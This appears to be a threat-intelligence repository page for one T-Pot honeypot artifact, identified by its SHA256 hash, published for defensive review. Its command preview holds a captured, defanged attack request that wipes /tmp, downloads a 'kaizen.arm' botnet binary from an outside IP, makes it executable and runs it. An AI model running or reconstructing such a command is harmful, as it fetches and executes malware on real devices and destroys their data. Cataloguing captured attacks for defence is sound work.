# 22dc7c044948730d0a3206ddd8a68af168349b0cd488c75fa2256c2fc5b68a56

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `22dc7c044948730d0a3206ddd8a68af168349b0cd488c75fa2256c2fc5b68a56` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /shell?cd+/tmp;rm+-rf+*;wget+hxxp://176[.]65[.]149[.]XXX/bins/kaizen.arm;chmod+777+kaizen.arm;./kaizen.arm HTTP/1[.]1
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
